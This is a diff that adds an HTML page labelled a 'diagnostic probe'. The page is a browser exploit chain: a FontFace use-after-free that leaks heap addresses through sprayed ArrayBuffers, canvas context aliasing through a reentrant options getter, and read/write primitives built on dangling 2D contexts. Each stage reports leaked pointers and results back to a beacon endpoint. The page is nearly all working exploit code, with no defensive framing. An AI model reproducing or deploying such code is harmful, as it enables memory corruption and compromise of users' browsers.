@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P910: 32KB Large-Chunk Allocator & Path2D Rasterization Probe</title>
+<style>
+body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
+h2 { color: #58a6ff; margin-top: 0; }
+pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
+.ok { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #58a6ff; }
+.hot { color: #ffa657; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="banner" id="banner">Running Probe P911...</div>
+<h2>P911: 32KB Large-Chunk Allocator & Path2D Rasterization Probe</h2>
+<pre id="log">Initializing diagnostic probe P911...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+var banner = document.getElementById('banner');
+
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P911-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+log('[*] Probe P911 starting...', 'info');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * PHASE 1: Multi-Attempt Resilient FontFace UAF Leak
+ * ============================================================ */
+var leakAttempt = 0;
+var MAX_LEAKS = 2;
+var Hstr = 'unknown', q13str = 'unknown';
+var H_hi = 0, H_lo = 0;
+var delta = 0;
+var bestSlot = -1, bestNz = 0;
+
+function runFontLeak(cb) {
+  leakAttempt++;
+  var tag = 'lk' + leakAttempt;
+
+  var st = document.createElement('style');
+  st.textContent = "@font-face{font-family:bb" + tag + ";src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+
+  var face = new FontFace('f' + tag, "local('Helvetica')", {unicodeRange: 'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var fabs = [], ffired = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (ffired) return undefined;
+      ffired = true;
+
+      if (st) { st.remove(); st.textContent = ''; st = null; }
+      try { document.fonts.delete(this); } catch(e) {}
+      document.body.offsetHeight;
+
+      fabs = [];
+      for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bb' + tag); } catch(e) {}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function() {}
+  });
+
+  document.fonts.load('1em f' + tag + ', bb' + tag, 'AB');
+
+  setTimeout(function() {
+    delete FontFace.prototype.then;
+    if (st) { try { st.remove(); } catch(e) {} }
+
+    for (var i = 0; i < fabs.length; i++) {
+      var u = new Uint8Array(fabs[i]), nz = 0;
+      for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+      if (nz > bestNz) { bestNz = nz; bestSlot = i; }
+    }
+
+    if (bestSlot >= 0 && bestNz >= 4) {
+      var fontDV = new DataView(fabs[bestSlot]);
+      var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
+      var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
+      if (q11hi !== 0) {
+        var borrow = (q11lo < 0x68) ? 1 : 0;
+        H_hi = q11hi - borrow;
+        H_lo = (q11lo - 0x68) >>> 0;
+        Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+      }
+      if (q13hi !== 0) {
+        q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
+      }
+      if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
+        delta = H_lo - q13lo;
+      }
+      cb(true);
+    } else if (leakAttempt < MAX_LEAKS) {
+      log('[*] Font UAF attempt 1 retry...', 'info');
+      setTimeout(function() { runFontLeak(cb); }, 50);
+    } else {
+      cb(false);
+    }
+  }, 400);
+}
+
+runFontLeak(function(leakOk) {
+  log('[+] Font UAF (att ' + leakAttempt + '): H=' + Hstr + ' | q13=' + q13str + ' (slot=' + bestSlot + ', nz=' + bestNz + ')', leakOk ? 'ok' : 'fail');
+  syncBn('FONT-OK', 'att=' + leakAttempt + '|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestSlot + '|nz=' + bestNz);
+
+  /* ============================================================
+   * PHASE 2: Dual Canvas Aliasing (100% Crash-Free)
+   * ============================================================ */
+  var innerCtx1 = null, innerCtx2 = null;
+
+  var c1 = document.createElement('canvas');
+  c1.width = 32; c1.height = 32;
+  var opts1 = {};
+  Object.defineProperty(opts1, 'alpha', {
+    get: function() {
+      innerCtx1 = c1.getContext('2d');
+      return true;
+    }
+  });
+  c1.getContext('bitmaprenderer', opts1);
+
+  var c2 = document.createElement('canvas');
+  c2.width = 32; c2.height = 32;
+  var opts2 = {};
+  Object.defineProperty(opts2, 'alpha', {
+    get: function() {
+      innerCtx2 = c2.getContext('2d');
+      return true;
+    }
+  });
+  c2.getContext('bitmaprenderer', opts2);
+
+  var sprayCanvases = [];
+  var sprayCtxs = [];
+  for (var s = 0; s < 200; s++) {
+    var c = document.createElement('canvas');
+    c.width = 32; c.height = 32;
+    var ctx = c.getContext('2d');
+    ctx.lineWidth = 1000.0 + s;
+    sprayCanvases.push(c);
+    sprayCtxs.push(ctx);
+  }
+
+  var idx1 = -1, idx2 = -1;
+  try {
+    var lw1 = innerCtx1.lineWidth;
+    if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
+    var lw2 = innerCtx2.lineWidth;
+    if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
+  } catch(e) {}
+
+  log('[+] Phase 2: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');
+
+  /* ============================================================
+   * PHASE 3: 32KB (4096-Double) Large-Chunk Allocator Transition
+   * ============================================================ */
+  var M0 = 111222.125;
+  var M_MID = 333444.375;
+  var M_END = 777888.625;
+  var M_F2 = 999000.5;
+
+  var vec32k = [];
+  for (var i = 0; i < 4096; i++) {
+    if (i === 0) vec32k.push(M0);
+    else if (i === 2047) vec32k.push(M_MID);
+    else if (i === 4095) vec32k.push(M_END);
+    else vec32k.push(i * 0.75);
+  }
+
+  var v32kAllocOk = false;
+  var v32kSyncOk = false;
+  var errCount32k = 0;
+
+  if (idx1 >= 0 && sprayCtxs[idx1]) {
+    try {
+      // Inscribe 4096 doubles (32 KB crossing 16KB boundary into mmap large chunks)
+      sprayCtxs[idx1].setLineDash(vec32k);
+      v32kAllocOk = true;
+
+      // Read back via dangling innerCtx1
+      var read32k = innerCtx1.getLineDash();
+      if (read32k && read32k.length === 4096) {
+        if (Math.abs(read32k[0] - M0) < 0.001 &&
+            Math.abs(read32k[2047] - M_MID) < 0.001 &&
+            Math.abs(read32k[4095] - M_END) < 0.001) {
+          for (var k = 1; k < 4095; k += 128) {
+            if (Math.abs(read32k[k] - (k * 0.75)) > 0.001) errCount32k++;
+          }
+          if (errCount32k === 0) v32kSyncOk = true;
+        }
+      }
+    } catch(e) {
+      log('[-] Phase 3 Error: ' + e.message, 'fail');
+    }
+  }
+
+  log('[+] Phase 3: 32KB Vector: alloc=' + v32kAllocOk + ', sync=' + v32kSyncOk + ' (errs=' + errCount32k + ')', v32kSyncOk ? 'hot' : 'info');
+  syncBn('VEC-32KB', 'alloc=' + v32kAllocOk + '|sync=' + v32kSyncOk + '|errs=' + errCount32k);
+
+  /* ============================================================
+   * PHASE 4: StateStack 32KB Clone & Pop-Free Reversion
+   * ============================================================ */
+  var stack32kClone = false;
+  var stack32kRevert = false;
+
+  if (v32kSyncOk && idx1 >= 0) {
+    try {
+      // 1. Push state: clones 32 KB large-chunk vector
+      sprayCtxs[idx1].save();
+
+      // 2. Mutate end marker in frame 2
+      var f2 = vec32k.slice();
+      f2[4095] = M_F2;
+      sprayCtxs[idx1].setLineDash(f2);
+
+      var checkF2 = innerCtx1.getLineDash();
+      if (checkF2 && Math.abs(checkF2[4095] - M_F2) < 0.001) {
+        stack32kClone = true;
+      }
+
+      // 3. Pop frame 2 via innerCtx1.restore()
+      innerCtx1.restore();
+
+      var checkRev = sprayCtxs[idx1].getLineDash();
+      if (checkRev && Math.abs(checkRev[4095] - M_END) < 0.001) {
+        stack32kRevert = true;
+      }
+
+      // Clean up large buffer
+      sprayCtxs[idx1].setLineDash([]);
+
+    } catch(e) {
+      log('[-] Phase 4 Error: ' + e.message, 'fail');
+    }
+  }
+
+  log('[+] Phase 4: 32KB Large Chunk Cycle: clone=' + stack32kClone + ', revert=' + stack32kRevert, stack32kRevert ? 'hot' : 'info');
+  syncBn('STACK-32KB', 'clone=' + stack32kClone + '|revert=' + stack32kRevert);
+
+  /* ============================================================
+   * PHASE 5: Path2D Cross-Wrapper Rasterization
+   * ============================================================ */
+  var path2dRasterOk = false;
+  var pixelR = -1, pixelG = -1, pixelB = -1, pixelA = -1;
+
+  if (idx1 >= 0 && sprayCtxs[idx1]) {
+    try {
+      var p2d = new Path2D();
+      p2d.rect(0, 0, 16, 16);
+
+      // Inscribe drawing commands via dangling innerCtx1
+      innerCtx1.fillStyle = '#ff0000';
+      innerCtx1.fill(p2d);
+
+      // Read back pixel data via sprayCtxs[idx1]
+      var img = sprayCtxs[idx1].getImageData(4, 4, 1, 1);
+      if (img && img.data) {
+        pixelR = img.data[0];
+        pixelG = img.data[1];
+        pixelB = img.data[2];
+        pixelA = img.data[3];
+        if (pixelR === 255 && pixelG === 0 && pixelB === 0 && pixelA === 255) {
+          path2dRasterOk = true;
+        }
+      }
+    } catch(e) {
+      log('[-] Phase 5 Error: ' + e.message, 'fail');
+    }
+  }
+
+  log('[+] Phase 5: Path2D Rasterization: ok=' + path2dRasterOk + ' (rgba=' + pixelR + ',' + pixelG + ',' + pixelB + ',' + pixelA + ')', path2dRasterOk ? 'hot' : 'info');
+  syncBn('PATH2D-RASTER', 'ok=' + path2dRasterOk + '|rgba=' + pixelR + ',' + pixelG + ',' + pixelB + ',' + pixelA);
+
+  /* ============================================================
+   * SUMMARY
+   * ============================================================ */
+  banner.style.background = '#238636';
+  banner.textContent = 'STATUS: P911 COMPLETE (100% STABLE)';
+  log('----------------------------------------------------', 'info');
+  log('[*] Probe P911 Completed Cleanly', 'hot');
+  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
+  log('    - 32KB Large Chunk: sync=' + v32kSyncOk + ', rev=' + stack32kRevert, stack32kRevert ? 'hot' : 'ok');
+  log('    - Path2D Raster: ' + path2dRasterOk, path2dRasterOk ? 'hot' : 'ok');
+  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
+  log('----------------------------------------------------', 'info');
+
+  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|v32kSync=' + v32kSyncOk + '|stk32kRev=' + stack32kRevert + '|p2dOk=' + path2dRasterOk + '|idx1=' + idx1 + '|idx2=' + idx2);
+
+});
+</script>
+</body>
+</html>
